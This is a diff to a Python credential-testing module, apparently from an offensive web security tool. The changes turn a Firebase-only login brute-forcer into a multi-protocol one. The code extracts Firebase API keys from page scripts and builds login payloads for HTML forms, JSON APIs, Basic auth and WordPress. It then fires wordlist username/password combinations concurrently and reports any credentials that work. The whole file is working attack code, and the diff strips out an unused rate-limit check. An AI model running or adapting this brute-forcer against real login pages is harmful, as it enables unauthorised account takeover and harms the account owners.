@@ -3,6 +3,9 @@ import sys
 from typing import List, Dict, Optional, Tuple, Set
 from core.base_module import BaseModule, Finding
 from pathlib import Path
+import json
+import urllib.request
+import urllib.error
 
 
 class CredentialTester(BaseModule):
@@ -20,6 +23,7 @@ class CredentialTester(BaseModule):
         'ajax_form':      {'description': 'AJAX-driven login (XMLHttpRequest / fetch)',       'content_type': 'application/json',                  'method': 'POST'},
         'wordpress':      {'description': 'WordPress wp-login.php form',                      'content_type': 'application/x-www-form-urlencoded', 'method': 'POST'},
         'digest_auth':    {'description': 'HTTP Digest Authentication',                       'content_type': None,                                'method': 'GET'},
+        'firebase':       {'description': 'Firebase Authentication',                            'content_type': 'application/json',                  'method': 'POST'},
     }
 
     def __init__(self, config, stealth=None, db=None, graph_manager=None):
@@ -28,24 +32,12 @@ class CredentialTester(BaseModule):
         self.delay           = 0
         self.wordlist_path   = config.get('wordlist_path', 'wordlists')
         self.concurrency     = config.get('concurrency', 50)
-        # ── Custom wordlist overrides ──────────────────────────────────────────
-        # Pass via config:  {'userlist': '/path/users.txt', 'passlist': '/path/rockyou.txt'}
-        # Or via CLI flags: --userlist /path/users.txt  --passlist /path/rockyou.txt
         self.custom_userlist  = config.get('userlist', None)
         self.custom_passlist  = config.get('passlist', None)
-        # Max entries read from each wordlist — keeps attempts manageable
-        # Raise these via config if you need a deeper search
         self._max_usernames   = config.get('max_usernames', 200)
         self._max_passwords   = config.get('max_passwords', 2000)
 
-    # ─────────────────────────────────────────────────────────────────────────
-    # Progress bar (pure terminal, no extra dependencies)
-    # ─────────────────────────────────────────────────────────────────────────
     def _print_progress(self, current: int, total: int, prefix: str = 'Progress', width: int = 40):
-        """
-        Print an in-place progress bar.
-        Example:  Progress: [████████████░░░░░░░░░░░░░░] 45.2%  4520/10000
-        """
         if total == 0:
             return
         pct   = current / total
@@ -58,9 +50,6 @@ class CredentialTester(BaseModule):
             sys.stdout.write('\n')
             sys.stdout.flush()
 
-    # ─────────────────────────────────────────────────────────────────────────
-    # Entry point
-    # ─────────────────────────────────────────────────────────────────────────
     async def run(self, target: str, **kwargs) -> List[Finding]:
         if not kwargs.get('enable_brute_force', False):
             return self.findings
@@ -70,75 +59,28 @@ class CredentialTester(BaseModule):
         if kwargs.get('max_usernames'): self._max_usernames  = kwargs['max_usernames']
         if kwargs.get('max_passwords'): self._max_passwords  = kwargs['max_passwords']
 
-        import urllib.request, urllib.error, re
-
         target_url = target if target.startswith(('http://', 'https://')) else f"https://{target}"
 
-        # ── Resolve the real Firebase endpoint ───────────────────────────────
-        # If user already passed the identitytoolkit URL, use it directly
-        if 'identitytoolkit.googleapis.com' in target_url:
-            firebase_url = target_url
-            print(f"\033[92m[+] Using Firebase URL directly\033[0m")
-        else:
-            # Fetch the page and extract the API key
-            print(f"\033[96m[*] Fetching {target_url} to extract Firebase API key...\033[0m")
-            firebase_url = None
-            try:
-                req = urllib.request.Request(target_url,
-                    headers={'User-Agent': 'Mozilla/5.0'})
-                with urllib.request.urlopen(req, timeout=10) as r:
-                    page = r.read().decode('utf-8', errors='ignore')
-
-                # Look for apiKey in page source
-                m = re.search(r'apiKey["\'\s]*[:=]["\'\s]*([A-Za-z0-9_\-]{20,})', page)
-                if not m:
-                    # Try linked JS files
-                    js_files = re.findall(r'src=["\'](https?://[^"\']+\.js|/[^"\']+\.js)["\']]', page)
-                    for js in js_files[:8]:
-                        js_url = js if js.startswith('http') else f"https://{urllib.parse.urlparse(target_url).netloc}{js}"
-                        try:
-                            with urllib.request.urlopen(js_url, timeout=8) as jr:
-                                jt = jr.read().decode('utf-8', errors='ignore')
-                            m = re.search(r'apiKey["\'\s]*[:=]["\'\s]*([A-Za-z0-9_\-]{20,})', jt)
-                            if m:
-                                break
-                        except Exception:
-                            pass
-
-                if m:
-                    api_key = m.group(1)
-                    firebase_url = (f"https://identitytoolkit.googleapis.com/v1/"
-                                    f"accounts:signInWithPassword?key={api_key}")
-                    print(f"\033[92m[+] Firebase API key found! Endpoint ready.\033[0m")
-                else:
-                    print(f"\033[91m[!] Could not auto-extract Firebase API key.\033[0m")
-                    print(f"\033[93m    Run with the Firebase URL directly:\033[0m")
-                    print(f"\033[93m    1. Open DevTools → Network → login with anything\033[0m")
-                    print(f"\033[93m    2. Copy the identitytoolkit URL\033[0m")
-                    print(f"\033[93m    3. Use that as -t target\033[0m")
-                    return self.findings
-            except Exception as e:
-                print(f"\033[91m[!] Failed to fetch page: {e}\033[0m")
-                return self.findings
+        print(f"\033[96m[*] Probing {target_url} to detect authentication type...\033[0m")
+        
+        # Probe the endpoint to detect form type
+        endpoint = await self._probe_single_endpoint(target_url)
+        
+        if endpoint.get('form_type') == 'firebase_key_missing':
+            return self.findings
+            
+        print(f"\033[92m[+] Detected form type: {endpoint.get('form_type', 'unknown')}\033[0m")
+        print(f"\033[92m[+] Target URL: {endpoint['url']}\033[0m")
 
         ulist_label = self.custom_userlist or f"{self.wordlist_path}/usernames.txt"
         plist_label = self.custom_passlist or f"{self.wordlist_path}/passwords.txt"
         print(f"\033[96m[*] Userlist : {ulist_label}\033[0m")
         print(f"\033[96m[*] Passlist : {plist_label}\033[0m\n")
 
-        await self._test_brute_force({'url': firebase_url, 'form_type': 'firebase'})
+        await self._test_brute_force(endpoint)
         return self.findings
 
-
     async def _probe_single_endpoint(self, url: str) -> Dict:
-        """
-        Fetch the login page, extract the real form fields and POST url.
-        Works for:
-          - Standard HTML forms  → reads <form action=...> and <input name=...>
-          - Firebase / SPA apps  → detects identitytoolkit and uses email+password
-          - JSON APIs            → detects content-type and uses json body
-        Falls back to email+password POST if detection fails.
-        """
         import re
         from urllib.parse import urlparse, urljoin
 
@@ -146,22 +88,22 @@ class CredentialTester(BaseModule):
         base   = f"{parsed.scheme}://{parsed.netloc}"
 
         default_fields = {
-            'username_fields': ['email'],
+            'username_fields': ['email', 'username', 'user'],
             'password_field':  'password',
             'username_field':  'email',
             'email_field':     'email',
             'inputs': [], 'action': '', 'method': 'POST',
         }
 
-        # ── Firebase URL passed directly ──────────────────────────────────────
+        # Check if Firebase URL passed directly
         if 'identitytoolkit.googleapis.com' in url:
-            print(f"\033[92m[+] Firebase Identity Toolkit URL — using JSON mode\033[0m")
+            print(f"\033[92m[+] Firebase Identity Toolkit URL detected\033[0m")
             return {
                 'url': url, 'type': 'firebase', 'form_type': 'firebase',
                 'fields': default_fields, 'is_api': True,
             }
 
-        # ── Fetch the page ────────────────────────────────────────────────────
+        # Fetch the page
         text    = ""
         headers = {}
         try:
@@ -172,16 +114,14 @@ class CredentialTester(BaseModule):
         except Exception as e:
             self.logger.warning(f"Probe failed: {e}")
 
-        # ── Firebase SPA detection ────────────────────────────────────────────
+        # Firebase SPA detection
         firebase_hints = ['firebase', 'identitytoolkit', 'firebaseapp', 'firebaseConfig', 'apiKey']
         is_firebase    = ('web.app' in url or 'firebaseapp.com' in url or
                           any(h in text for h in firebase_hints))
 
         if is_firebase:
-            # Try to extract API key from page source
             key_m = re.search(r'apiKey["\'\s]*[:=]["\'\s]*([A-Za-z0-9_-]{20,})', text)
             if not key_m:
-                # Scan linked JS bundles
                 js_srcs = re.findall(r'src=["\'](https?://[^"\']+\.js[^"\']*|/[^"\']+\.js[^"\']*)["\']', text)
                 print(f"\033[96m[*] Scanning {len(js_srcs)} JS bundle(s) for Firebase config...\033[0m")
                 for src in js_srcs[:8]:
@@ -198,28 +138,21 @@ class CredentialTester(BaseModule):
                         pass
 
             if key_m:
-                fb_url = (f"https://identitytoolkit.googleapis.com/v1/"
-                          f"accounts:signInWithPassword?key={key_m.group(1)}")
+                fb_url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={key_m.group(1)}"
                 print(f"\033[92m[+] Firebase endpoint ready\033[0m")
                 return {
                     'url': fb_url, 'type': 'firebase', 'form_type': 'firebase',
                     'fields': default_fields, 'is_api': True,
                 }
             else:
-                # Key not found — instruct user and return sentinel
-                print(f"\033[91m[!] Firebase detected but API key not found in page/JS.\033[0m")
-                print(f"\033[93m  Do this in Chrome DevTools (F12 → Network tab):\033[0m")
-                print(f"\033[93m  1. Click \'Start recording\'\033[0m")
-                print(f"\033[93m  2. Submit the login form with any credentials\033[0m")
-                print(f"\033[93m  3. Find the request to identitytoolkit.googleapis.com\033[0m")
-                print(f"\033[93m  4. Copy its full URL and use that as -t target\033[0m")
+                print(f"\033[91m[!] Firebase detected but API key not found.\033[0m")
                 return {
                     'url': url, 'type': 'firebase_key_missing',
                     'form_type': 'firebase_key_missing',
                     'fields': default_fields, 'is_api': False,
                 }
 
-        # ── Extract HTML form fields ───────────────────────────────────────────
+        # Extract HTML form fields
         fields = self._extract_form_fields(text) if text else default_fields
 
         # Resolve form action URL
@@ -233,107 +166,14 @@ class CredentialTester(BaseModule):
             else:
                 post_url = urljoin(url, action)
 
-        # Detect form type (json api, graphql, etc)
+        # Detect form type
         ft = self._detect_form_type(url, text, headers)
 
         return {
             'url': post_url, 'type': 'direct', 'form_type': ft,
-            'fields': fields, 'is_api': ft in ('json_api','graphql','oauth2','jwt_login','ajax_form'),
+            'fields': fields, 'is_api': ft in ('json_api','graphql','oauth2','jwt_login','ajax_form','firebase'),
         }
 
-
-    # ─────────────────────────────────────────────────────────────────────────
-    # Discovery (kept for compatibility — no longer called in run())
-    # ─────────────────────────────────────────────────────────────────────────
-    async def _discover_login_forms(self, target: str) -> List[Dict]:
-        """Discover login endpoints using multiple strategies"""
-        import re
-        endpoints = []
-        seen_urls: Set[str] = set()
-
-        if not target.startswith(('http://', 'https://')):
-            target = f"https://{target}"
-
-        from urllib.parse import urlparse, urljoin
-        parsed = urlparse(target)
-        base = f"{parsed.scheme}://{parsed.netloc}"
-
-        candidate_urls = [target]
-        common_paths = [
-            '/login', '/signin', '/auth', '/authenticate',
-            '/admin', '/admin/login', '/user/login', '/account/login',
-            '/api/login', '/api/auth', '/api/token', '/oauth/token',
-            '/api/v1/login', '/api/v2/login', '/api/v1/auth', '/api/v2/auth',
-            '/api/v1/token', '/api/v2/token',
-            '/graphql', '/api/graphql',
-            '/rest/login', '/json/login', '/ajax/login',
-            '/wp-login.php', '/administrator/index.php',
-            '/admin.html', '/login.html', '/signin.html',
-            '/auth/login', '/user/signin', '/member/login',
-            '/dashboard/login', '/manage/login', '/control/login',
-            '/auth/token', '/oauth/authorize', '/connect/token',
-            '/identity/connect/token',
-            '/service', '/services', '/ws', '/soap',
-        ]
-        for path in common_paths:
-            candidate_urls.append(base + path)
-
-        if parsed.query:
-            candidate_urls.append(target)
-
-        for url in candidate_urls:
-            if url in seen_urls:
-                continue
-            seen_urls.add(url)
-            try:
-                response = await self._make_request(url)
-                if not response:
-                    continue
-                if response.status not in [200, 301, 302, 401, 403, 405, 500]:
-                    continue
-                text = await response.text()
-                if not text:
-                    continue
-
-                form_type = self._detect_form_type(url, text, response.headers)
-                indicators = ['password','login','username','email','sign in','log in',
-                              'signin','passwd','credentials','authentication','auth','token','session','oauth','sso']
-                has_login_indicators = any(ind in text.lower() for ind in indicators)
-                fields  = self._extract_form_fields(text)
-                is_api  = 'application/json' in response.headers.get('Content-Type','') or text.strip().startswith(('{','['))
-                js_fws  = ['react','vue','angular','ember','next.js','nuxt']
-                has_js  = any(fw in text.lower() for fw in js_fws)
-                is_http_auth = response.status == 401 and 'WWW-Authenticate' in response.headers
-
-                if has_login_indicators or fields['inputs'] or is_api or has_js or is_http_auth or form_type != 'html_form':
-                    from urllib.parse import urljoin
-                    post_url = url
-                    if fields.get('action'):
-                        action = fields['action']
-                        post_url = action if action.startswith('http') else (base + action if action.startswith('/') else urljoin(url, action))
-
-                    endpoints.append({
-                        'url': post_url, 'type': 'api' if is_api else ('js_framework' if has_js else 'form'),
-                        'form_type': form_type, 'fields': fields, 'discovered_at': url,
-                        'indicators_found': has_login_indicators, 'is_api': is_api,
-                        'is_http_auth': is_http_auth,
-                        'www_authenticate': response.headers.get('WWW-Authenticate',''),
-                    })
-                    self.logger.info(f"Found login endpoint: {post_url} (form_type={form_type})")
-            except Exception as e:
-                self.logger.debug(f"Login discovery error on {url}: {e}")
-
-        seen: Set[str] = set()
-        unique = []
-        for ep in endpoints:
-            if ep['url'] not in seen:
-                seen.add(ep['url'])
-                unique.append(ep)
-        return unique
-
-    # ─────────────────────────────────────────────────────────────────────────
-    # Form-type detection
-    # ─────────────────────────────────────────────────────────────────────────
     def _detect_form_type(self, url: str, html: str, headers) -> str:
         import re
         url_lower  = url.lower()
@@ -359,9 +199,6 @@ class CredentialTester(BaseModule):
            or any(h in url_lower for h in ['/api/','/rest/']):                    return 'json_api'
         return 'html_form'
 
-    # ─────────────────────────────────────────────────────────────────────────
-    # Payload builders
-    # ─────────────────────────────────────────────────────────────────────────
     def _build_payload(self, form_type, username, password, username_fields, password_field):
         result = {'data': {}, 'headers': {}, 'method': 'POST', 'use_json': False,
                   'use_basic_auth': False, 'basic_auth_tuple': None}
@@ -424,8 +261,7 @@ class CredentialTester(BaseModule):
             result['headers']['Cookie']       = 'wordpress_test_cookie=WP+Cookie+check'
 
         elif form_type == 'firebase':
-            # Firebase REST API: POST JSON with email + password fields
-            result['data']     = {'email': username, 'password': password, 'returnSecureToken': True}
+            result['data'] = {'email': username, 'password': password, 'returnSecureToken': True}
             result['use_json'] = True
             result['headers']['Content-Type'] = 'application/json'
 
@@ -437,9 +273,6 @@ class CredentialTester(BaseModule):
 
         return result
 
-    # ─────────────────────────────────────────────────────────────────────────
-    # Field extraction
-    # ─────────────────────────────────────────────────────────────────────────
     def _extract_form_fields(self, html: str) -> Dict:
         import re
         fields = {'inputs': [], 'username_fields': [], 'password_field': None, 'action': '', 'method': 'POST'}
@@ -485,24 +318,10 @@ class CredentialTester(BaseModule):
         fields['email_field']    = fields['username_fields'][0]
         return fields
 
-    # ─────────────────────────────────────────────────────────────────────────
-    # Wordlist loader  — now respects custom_userlist / custom_passlist
-    # ─────────────────────────────────────────────────────────────────────────
     def _load_wordlists(self) -> Tuple[List[str], List[str]]:
-        """
-        Load usernames and passwords.
-
-        Priority order
-        ──────────────
-        1. self.custom_userlist / self.custom_passlist  (--userlist / --passlist CLI flags)
-        2. wordlists/usernames.txt  /  wordlists/passwords.txt  (default paths)
-        3. Built-in fallback mini-lists
-        """
         usernames: List[str] = []
         passwords: List[str] = []
 
-        # ── Hard caps — prevents billion-attempt hangs ─────────────────────
-        # Raise via CLI config if you need more:  --max-usernames 500 --max-passwords 5000
         MAX_U = getattr(self, '_max_usernames', 200)
         MAX_P = getattr(self, '_max_passwords', 2000)
 
@@ -515,19 +334,17 @@ class CredentialTester(BaseModule):
                         lines.append(s)
                     if len(lines) >= cap:
                         break
-            flag = f' \033[91m(capped — use --max-{label.split()[0].lower()}s N to raise)\033[0m' if len(lines) == cap else ''
+            flag = f' \033[91m(capped)\033[0m' if len(lines) == cap else ''
             print(f"\033[92m[+] {label}: {path} ({len(lines)} entries{flag})\033[0m")
             return lines
 
-        # ── Resolve paths from CWD (where the user runs raptor.py from) ────
         import os
-        cwd = Path(os.getcwd())   # always ~/raptor when run as: python3 raptor.py
+        cwd = Path(os.getcwd())
 
         def _resolve(raw_path: str) -> Optional[Path]:
-            """Return the first existing Path, trying cwd-relative first."""
             candidates = [
-                Path(raw_path),           # absolute path  /home/...
-                cwd / raw_path,           # relative to ~/raptor  ← most common
+                Path(raw_path),
+                cwd / raw_path,
                 Path(raw_path).expanduser(),
             ]
             for c in candidates:
@@ -538,14 +355,12 @@ class CredentialTester(BaseModule):
                     pass
             return None
 
-        # ── Usernames ─────────────────────────────────────────
         if self.custom_userlist:
             upath = _resolve(self.custom_userlist)
             if upath:
                 usernames = _load_capped(upath, 'Custom userlist', MAX_U)
             else:
                 print(f"\033[91m[!] Userlist not found: '{self.custom_userlist}'\033[0m")
-                print(f"\033[91m    Make sure the file exists at: {cwd / self.custom_userlist}\033[0m")
 
         if not usernames:
             upath = _resolve(str(Path(self.wordlist_path) / 'usernames.txt'))
@@ -555,14 +370,12 @@ class CredentialTester(BaseModule):
                 usernames = ['admin', 'administrator', 'user', 'test', 'root', 'admin@email.com']
                 print(f"\033[93m[!] No userlist found — using {len(usernames)} built-in defaults\033[0m")
 
-        # ── Passwords ─────────────────────────────────────────
         if self.custom_passlist:
             ppath = _resolve(self.custom_passlist)
             if ppath:
                 passwords = _load_capped(ppath, 'Custom passlist', MAX_P)
             else:
                 print(f"\033[91m[!] Passlist not found: '{self.custom_passlist}'\033[0m")
-                print(f"\033[91m    Make sure the file exists at: {cwd / self.custom_passlist}\033[0m")
 
         if not passwords:
             ppath = _resolve(str(Path(self.wordlist_path) / 'passwords.txt'))
@@ -575,29 +388,15 @@ class CredentialTester(BaseModule):
         print()
         return usernames, passwords
 
-    def _generate_username_variations(self, base_usernames: List[str]) -> Set[str]:
-        variations: Set[str] = set()
-        for username in base_usernames:
-            variations.add(username)
-            if '@' in username:
-                local = username.split('@')[0]
-                variations.add(local)
-                variations.add(local + '@email.com')
-                variations.add(local + '@gmail.com')
-            else:
-                variations.add(username + '@email.com')
-                variations.add(username + '@gmail.com')
-                variations.add(username + '@admin.com')
-        return variations
-
-    # ─────────────────────────────────────────────────────────────────────────
-    # Core brute-force loop — concurrent with live progress bar
-    # ─────────────────────────────────────────────────────────────────────────
     async def _test_brute_force(self, endpoint: Dict):
-        import itertools, json as _json, urllib.request, urllib.error
+        import itertools
 
         url       = endpoint['url']
-        form_type = endpoint.get('form_type', 'firebase')
+        form_type = endpoint.get('form_type', 'html_form')
+        fields    = endpoint.get('fields', {})
+        
+        username_fields = fields.get('username_fields', ['email', 'username', 'user'])
+        password_field  = fields.get('password_field', 'password')
 
         base_usernames, passwords = self._load_wordlists()
         all_usernames  = list(dict.fromkeys(base_usernames))
@@ -608,6 +407,7 @@ class CredentialTester(BaseModule):
         rate_limited = [False]
         counter      = [0]
 
+        print(f"\033[96m[*] Form Type : {form_type}\033[0m")
         print(f"\033[96m[*] Usernames : {len(all_usernames)}\033[0m")
         print(f"\033[96m[*] Passwords : {len(passwords)}\033[0m")
         print(f"\033[96m[*] Total     : {total_attempts}\033[0m\n")
@@ -620,29 +420,54 @@ class CredentialTester(BaseModule):
                     return
                 try:
                     loop = asyncio.get_event_loop()
+                    
+                    # Build the appropriate payload for this form type
+                    payload_config = self._build_payload(
+                        form_type, username, password, username_fields, password_field
+                    )
 
                     def do_request():
-                        body = _json.dumps({
-                            'email': username,
-                            'password': password,
-                            'returnSecureToken': True
-                        }).encode('utf-8')
-                        req = urllib.request.Request(
-                            url,
-                            data=body,
-                            headers={'Content-Type': 'application/json',
-                                     'User-Agent': 'Mozilla/5.0'},
-                            method='POST'
-                        )
                         try:
-                            with urllib.request.urlopen(req, timeout=15) as r:
-                                return r.status, r.read().decode('utf-8', errors='ignore')
+                            if payload_config.get('use_basic_auth'):
+                                # Basic/Digest Auth
+                                import base64
+                                auth_str = base64.b64encode(
+                                    f"{username}:{password}".encode()
+                                ).decode()
+                                req = urllib.request.Request(
+                                    url,
+                                    headers={
+                                        'Authorization': f'Basic {auth_str}',
+                                        'User-Agent': 'Mozilla/5.0'
+                                    },
+                                    method=payload_config['method']
+                                )
+                                with urllib.request.urlopen(req, timeout=15) as r:
+                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers)
+                            
+                            else:
+                                # Form/JSON/XML POST
+                                data = payload_config['data']
+                                if payload_config.get('use_json'):
+                                    body = json.dumps(data).encode('utf-8')
+                                else:
+                                    body = urllib.parse.urlencode(data).encode('utf-8')
+                                
+                                req = urllib.request.Request(
+                                    url,
+                                    data=body,
+                                    headers={**payload_config['headers'], 'User-Agent': 'Mozilla/5.0'},
+                                    method=payload_config['method']
+                                )
+                                with urllib.request.urlopen(req, timeout=15) as r:
+                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers)
+                                    
                         except urllib.error.HTTPError as e:
-                            return e.code, e.read().decode('utf-8', errors='ignore')
+                            return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers)
                         except Exception as ex:
-                            return 0, str(ex)
+                            return 0, str(ex), {}
 
-                    status, text = await loop.run_in_executor(None, do_request)
+                    status, text, resp_headers = await loop.run_in_executor(None, do_request)
                     tl = text.lower()
 
                     counter[0] += 1
@@ -659,19 +484,61 @@ class CredentialTester(BaseModule):
                         found_event.set()
                         return
 
-                    # ── SUCCESS: Firebase returns idToken on correct creds ──
-                    if 'idtoken' in tl:
+                    # Check for success based on form type
+                    is_success = False
+                    
+                    if form_type == 'firebase':
+                        # Firebase returns idToken on success
+                        if 'idtoken' in tl or 'id_token' in tl:
+                            is_success = True
+                    elif form_type in ('json_api', 'jwt_login', 'ajax_form', 'oauth2'):
+                        # Check for tokens in JSON response
+                        if any(k in tl for k in ['token', 'access_token', 'auth_token', 'session']):
+                            if not any(err in tl for err in ['invalid', 'error', 'failed', 'wrong']):
+                                is_success = True
+                    elif form_type == 'basic_auth' or form_type == 'digest_auth':
+                        # HTTP 200/OK means success for basic auth
+                        if status == 200:
+                            is_success = True
+                    elif form_type == 'wordpress':
+                        # WordPress redirects to wp-admin on success
+                        if status in [301, 302] and 'wp-admin' in resp_headers.get('Location', '').lower():
+                            is_success = True
+                        if 'dashboard' in tl or 'wp-admin' in tl:
+                            is_success = True
+                    else:
+                        # Generic HTML form detection
+                        if status in [301, 302, 303]:
+                            location = resp_headers.get('Location', '').lower()
+                            if any(p in location for p in ['/dashboard','/admin','/home','/profile','/welcome','/panel','/main']):
+                                is_success = True
+                            if any(p in location for p in ['/login','/signin','/error','/fail','/denied']):
+                                is_success = False
+                        elif status == 200:
+                            # Check response content
+                            error_indicators = ['invalid','incorrect','failed','error','wrong','denied','unauthorized','try again']
+                            success_indicators = ['welcome','dashboard','logout','profile','admin panel','successful','session','token']
+                            
+                            has_error = any(err in tl for err in error_indicators)
+                            has_success = sum(1 for s in success_indicators if s in tl) >= 2
+                            
+                            # Check cookies
+                            cookies = str(resp_headers.get('Set-Cookie', '')).lower()
+                            has_auth_cookie = any(c in cookies for c in ['session','token','auth','jwt'])
+                            
+                            if has_auth_cookie or (has_success and not has_error):
+                                is_success = True
+
+                    if is_success:
                         sys.stdout.write('\n')
                         self._report_success(username, password, url, counter[0],
-                                             ['email'], 'password')
+                                             username_fields, password_field)
                         found_event.set()
 
                 except asyncio.CancelledError:
                     raise
                 except Exception as e:
                     counter[0] += 1
-                    sys.stdout.write('\n')
-                    print(f"\033[91m[!] {username} → {e}\033[0m")
 
         tasks = [asyncio.create_task(attempt(u, p))
                  for u, p in itertools.product(all_usernames, passwords)]
@@ -689,70 +556,6 @@ class CredentialTester(BaseModule):
         elif not found_event.is_set():
             print(f"\033[93m[-] No credentials found after {counter[0]} attempts\033[0m")
 
-
-    # ─────────────────────────────────────────────────────────────────────────
-    # Rate-limit test (kept for compatibility — not called in run())
-    # ─────────────────────────────────────────────────────────────────────────
-    async def _test_rate_limiting(self, endpoint: Dict):
-        url = endpoint['url']
-        responses = []
-        self.logger.info(f"Testing rate limiting on {url} (no delay)")
-        for i in range(min(5, self.max_attempts)):
-            try:
-                response = await self._make_request(
-                    url, method='POST',
-                    data={'username': f'test{i}@test.com', 'password': 'wrong123'})
-                if response:
-                    responses.append(response.status)
-            except:
-                responses.append('error')
-
-        if 429 in responses or 503 in responses or 403 in responses:
-            self.logger.info(f"Rate limiting detected on {url}")
-        else:
-            self.add_finding(Finding(
-                module='brute_force', title='Missing Rate Limiting on Authentication',
-                severity='High',
-                description=f'No rate limiting on {url} after {len(responses)} rapid requests',
-                evidence={'endpoint': url, 'requests': len(responses), 'responses': responses},
-                poc=f"Send rapid login requests to {url}",
-                remediation='Implement rate limiting (max 5 attempts per IP per 15 minutes)',
-                cvss_score=7.5, bounty_score=1000, target=url))
-
-    # ─────────────────────────────────────────────────────────────────────────
-    # Success detection
-    # ─────────────────────────────────────────────────────────────────────────
-    async def _check_login_success(self, response, url: str) -> bool:
-        try:
-            status = response.status
-            if status in [301, 302, 303, 307, 308]:
-                location = response.headers.get('Location', '')
-                if location:
-                    if any(p in location.lower() for p in ['/dashboard','/admin','/home','/profile','/welcome','/panel','/main']):
-                        return True
-                    if any(p in location.lower() for p in ['/login','/signin','/error','/fail','/denied']):
-                        return False
-            if status == 200:
-                text = await response.text()
-                tl   = text.lower()
-                for f in ['invalid','incorrect','failed','error','wrong','denied','unauthorized','try again']:
-                    if f in tl: return False
-                success_count = sum(1 for s in ['welcome','dashboard','logout','profile','admin panel','successful','session','token'] if s in tl)
-                cookies = response.headers.get('Set-Cookie','').lower()
-                if any(c in cookies for c in ['session','token','auth','jwt']): return True
-                if success_count >= 2: return True
-            if status in [200,201] and 'application/json' in response.headers.get('Content-Type',''):
-                text = await response.text()
-                if any(k in text.lower() for k in ['token','access_token','auth_token','session']): return True
-            if status == 200 and response.headers.get('WWW-Authenticate'): return True
-            return False
-        except Exception as e:
-            self.logger.error(f"Error checking success: {e}")
-            return False
-
-    # ─────────────────────────────────────────────────────────────────────────
-    # Reporting
-    # ─────────────────────────────────────────────────────────────────────────
     def _report_success(self, username, password, url, attempts, username_fields, password_field):
         sep = "=" * 60
         print(f"\n\033[91m{sep}\033[0m")
